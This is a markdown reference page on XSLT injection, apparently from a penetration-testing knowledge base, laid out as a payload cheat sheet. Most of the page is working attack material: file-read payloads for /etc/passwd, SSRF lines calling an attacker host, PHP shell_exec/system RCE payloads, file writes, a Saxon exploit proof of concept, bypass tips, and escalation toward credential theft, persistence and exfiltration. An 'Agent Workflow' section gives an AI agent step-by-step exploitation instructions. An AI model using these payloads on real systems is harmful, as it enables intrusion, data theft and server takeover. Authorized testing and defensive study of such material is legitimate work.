# XSLT Injection

> **Summary**: XSLT (Extensible Stylesheet Language Transformations) injection occurs when user input is embedded into XSL stylesheets or XML documents processed by an XSLT engine without sanitization.
> **Impact**: Local file read, SSRF, remote code execution, directory listing, and port scanning.
> **Typical Severity**: High / Critical

## Detection

### Indicators
- Application accepts XML/XSL input and transforms it server-side
- PDF generation, report generation, or data export features using XML pipelines
- Error messages referencing Saxon, Xalan, libxslt, or PHP XSLTProcessor
- ESI (Edge Side Includes) endpoints processing XSLT

### Automated Detection
- Inject `<xsl:value-of select="system-property('xsl:version')"/>` in XML input fields
- Fuzz XML inputs with XSLT tags and observe transformed output
- Wordlist: `https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xslt.txt`

### Manual Detection
1. Submit a basic XSL probe in any XML-accepting parameter:
   ```xml
   <xsl:value-of select="1+1"/>
   ```
2. If the output shows `2`, the input is being processed by an XSLT engine
3. Check for XSLT version and processor using the fingerprint payload below

## Exploitation

### Prerequisites
- User input is reflected in or controls part of an XSL stylesheet or XML document
- The server-side XSLT processor evaluates the injected content
- Depending on the processor, certain extensions (e.g., PHP namespace) must be enabled

### Step-by-Step

1. **Fingerprint the XSLT processor** -- identify version, vendor, and product:
   ```xml
   <?xml version="1.0" encoding="ISO-8859-1"?>
   <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
   <xsl:template match="/">
     Version: <xsl:value-of select="system-property('xsl:version')" />
     Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
     Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
     <xsl:if test="system-property('xsl:product-name')">
       Product Name: <xsl:value-of select="system-property('xsl:product-name')" />
     </xsl:if>
     <xsl:if test="system-property('xsl:product-version')">
       Product Version: <xsl:value-of select="system-property('xsl:product-version')" />
     </xsl:if>
   </xsl:template>
   </xsl:stylesheet>
   ```
   **Success**: Output shows version number, vendor string (e.g., "SAXON 9.x from Saxonica")

2. **Read local files** using a technique appropriate for the processor (see Payloads below)
   **Success**: Contents of `/etc/passwd` or target file appear in the output

3. **Perform SSRF** to reach internal services
   **Success**: Response from internal service returned in output or observable side effects

4. **Achieve RCE** using processor-specific extension functions
   **Success**: Command output (e.g., `uid=0(root)`) appears in response

### Payloads

#### Information Disclosure (All Processors)
```xml
<xsl:value-of select="system-property('xsl:version')" />
<xsl:value-of select="system-property('xsl:vendor')" />
<xsl:value-of select="system-property('xsl:vendor-url')" />
<xsl:value-of select="system-property('xsl:product-name')" />
<xsl:value-of select="system-property('xsl:product-version')" />
```

#### Local File Read

**XSLT 2.0+ (Saxon):**
```xml
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')"/>
```

**Via `document()` function (XSLT 1.0 / libxslt):**
```xml
<xsl:copy-of select="document('/etc/passwd')"/>
```

**Via XXE in the stylesheet:**
```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE dtd_sample[<!ENTITY ext_file SYSTEM "/etc/passwd">]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
  &ext_file;
</xsl:template>
</xsl:stylesheet>
```

**Via XXE with file:// scheme:**
```xml
<!DOCTYPE xsl:stylesheet [
  <!ENTITY passwd SYSTEM "file:///etc/passwd">
]>
<xsl:template match="/">
  &passwd;
</xsl:template>
```

**PHP XSLTProcessor (file_get_contents):**
```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:php="http://php.net/xsl">
<xsl:template match="/">
  <xsl:value-of select="php:function('file_get_contents','/etc/passwd')"/>
</xsl:template>
</xsl:stylesheet>
```

#### SSRF

**Via `xsl:include` or `document()`:**
```xml
<xsl:include href="http://<ATTACKER_IP>/xslt"/>
```
```xml
<xsl:copy-of select="document('http://<ATTACKER_IP>/ssrf')"/>
```

**Port scanning:**
```xml
<xsl:value-of select="document('http://<TARGET_IP>:<PORT>')"/>
```

#### Remote Code Execution

**PHP XSLTProcessor (`shell_exec`):**
```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:php="http://php.net/xsl">
<xsl:template match="/">
  <xsl:value-of select="php:function('shell_exec','id')" />
</xsl:template>
</xsl:stylesheet>
```

**PHP XSLTProcessor (`system`):**
```xml
<xsl:value-of select="php:function('system','id')" />
```

**PHP XSLTProcessor (assert for older PHP):**
```xml
<xsl:copy-of select="php:function('assert','var_dump(scandir(chr(46).chr(47)))==3')" />
```

#### Directory Listing (PHP)

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:php="http://php.net/xsl">
<xsl:template match="/">
  <xsl:value-of select="php:function('opendir','/var/www/')"/>
  <xsl:value-of select="php:function('readdir')"/> -
  <xsl:value-of select="php:function('readdir')"/> -
  <xsl:value-of select="php:function('readdir')"/> -
</xsl:template>
</xsl:stylesheet>
```

#### Write Files (XSLT 2.0 - Saxon)

```xml
<xsl:result-document href="local_file.txt">
  <xsl:text>Write Local File</xsl:text>
</xsl:result-document>
```

#### Write Files (Xalan-J Extension)

```xml
<xsl:template match="/">
  <redirect:open file="local_file.txt"/>
  <redirect:write file="local_file.txt">Write Local File</redirect:write>
  <redirect:close file="local_file.txt"/>
</xsl:template>
```

#### JavaScript Injection (Browser-Side XSLT)

```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
  <script>alert(document.domain);</script>
</xsl:template>
</xsl:stylesheet>
```

### Proof of Concept

```bash
# Install Saxon for local testing
sudo apt-get install default-jdk libsaxonb-java

# Create test XML
cat > test.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<catalog><cd><title>Test</title></cd></catalog>
EOF

# Create malicious XSL (file read)
cat > exploit.xsl << 'EOF'
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
<xsl:template match="/">
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')"/>
</xsl:template>
</xsl:stylesheet>
EOF

# Execute
saxonb-xslt -xsl:exploit.xsl test.xml
```

## Bypasses

- If `document()` is blocked, try XXE entity injection within the stylesheet DTD
- If PHP `system`/`shell_exec` is disabled, try `proc_open`, `passthru`, `popen`, or `assert`
- Use `xsl:include` or `xsl:import` to fetch external stylesheets with malicious payloads
- Embed payloads via `<?xml-stylesheet type="text/xsl" href="http://<ATTACKER>/ext.xsl"?>`
- For file read when `unparsed-text` is unavailable, fall back to `document()` with file:// URIs

## Escalation

- **File read to credential theft**: Read `wp-config.php`, `.env`, database configs
- **SSRF to internal network mapping**: Scan internal ports and services via `document()`
- **RCE to full compromise**: Use shell access to pivot, install persistence, exfiltrate data
- Chain with [XXE](xxe.md) techniques for external entity injection
- Chain with [SSRF](ssrf.md) to reach cloud metadata endpoints (`http://169.254.169.254/`)

## Tools

| Tool | Usage |
|------|-------|
| Burp Suite | Intercept and modify XML/XSL payloads in transit |
| saxonb-xslt | Local XSLT processing for payload testing: `saxonb-xslt -xsl:payload.xsl input.xml` |
| xsltproc | libxslt processor for testing: `xsltproc payload.xsl input.xml` |
| PayloadsAllTheThings | XSLT injection payload collection |

## Agent Workflow
> Step-by-step instructions for an AI agent to test for XSLT injection.

### Phase 1: Discovery
1. Identify features that process XML input: PDF/report generation, data transformation, XML-to-HTML rendering, ESI endpoints.
2. Look for error messages referencing XSLT processors: Saxon, Xalan, libxslt, PHP XSLTProcessor, .NET XslCompiledTransform.
3. Check if user input is embedded in XSL stylesheets or XML documents submitted to transformation endpoints.

### Phase 2: Validation
1. **Fingerprint the processor** -- inject the version detection payload:
   ```xml
   <xsl:value-of select="system-property('xsl:version')"/>
   <xsl:value-of select="system-property('xsl:vendor')"/>
   ```
   If version/vendor info is returned, XSLT injection is confirmed.
2. **Test basic evaluation** -- inject `<xsl:value-of select="1+1"/>` and check if `2` appears in the output.
3. Determine XSLT version (1.0 vs 2.0) -- version 2.0 supports `unparsed-text()` and other advanced functions.

### Phase 3: Exploitation
1. **Local file read** -- use `document()` or `unparsed-text()` to read server files:
   ```xml
   <xsl:value-of select="document('/etc/passwd')"/>
   <!-- XSLT 2.0 -->
   <xsl:value-of select="unparsed-text('/etc/passwd','utf-8')"/>
   ```
2. **SSRF** -- use `document()` or `xsl:include` to make server-side requests:
   ```xml
   <xsl:value-of select="document('http://<ATTACKER_SERVER>/')"/>
   ```
3. **RCE via PHP extensions** -- if the processor is PHP XSLTProcessor with `registerPHPFunctions`:
   ```xml
   <xsl:value-of select="php:function('system','id')"/>
   ```
4. **XXE within XSLT** -- embed an XXE payload in the XML document processed by the XSLT engine.

### Phase 4: Escalation
1. Chain with [SSRF](ssrf.md) to access internal services via `document()` or `xsl:include`.
2. Chain with [XXE](xxe.md) to exploit external entity processing within the XSLT context.
3. Achieve RCE via processor-specific extensions (PHP, Java, .NET).

## Decision Tree

```
Start: Identify XML/XSLT processing endpoint
  |
  +---> Inject system-property() probe
  |       +---> Version/vendor returned? --> XSLT injection confirmed
  |       +---> No output: Try in different input contexts (XML body, URL param, file upload)
  |
  +---> XSLT processor identified?
  |       +---> Xalan/Saxon (Java): document(), unparsed-text() for LFI/SSRF
  |       +---> libxslt (C): document() for LFI, limited extension support
  |       +---> PHP XSLTProcessor: php:function('system','cmd') for RCE
  |       +---> .NET XslCompiledTransform: msxsl:script for code execution
  |
  +---> XSLT 2.0?
          +---> Yes: unparsed-text() for file read, extended functions
          +---> No (1.0): document() for LFI/SSRF only
```

## Success Criteria
- [ ] XSLT processor version and vendor identified via system-property() probe
- [ ] Expression evaluation confirmed (1+1 returns 2)
- [ ] Local file read achieved via document() or unparsed-text()
- [ ] If SSRF: server-side request to attacker server confirmed
- [ ] If RCE: OS command execution via processor-specific extension functions

## References

- [PayloadsAllTheThings - XSLT Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSLT%20Injection)
- [Abusing XSLT for Practical Attacks - Arnaboldi (Black Hat 2015)](http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Abusing%20XSLT%20for%20practical%20attacks%20-%20Arnaboldi%20-%20Blackhat%202015.pdf)
- [Fortify - XSLT Injection](https://vulncat.fortify.com/en/detail?id=desc.dataflow.java.xslt_injection)
- [ESI Injection Part 2 - GoSecure](https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/)

## Cross-References

- [XXE](xxe.md) -- XXE techniques can be embedded within XSLT stylesheets
- [SSRF](ssrf.md) -- XSLT `document()` and `xsl:include` enable server-side requests
- [Command Injection](command-injection.md) -- PHP XSLT extensions allow OS command execution
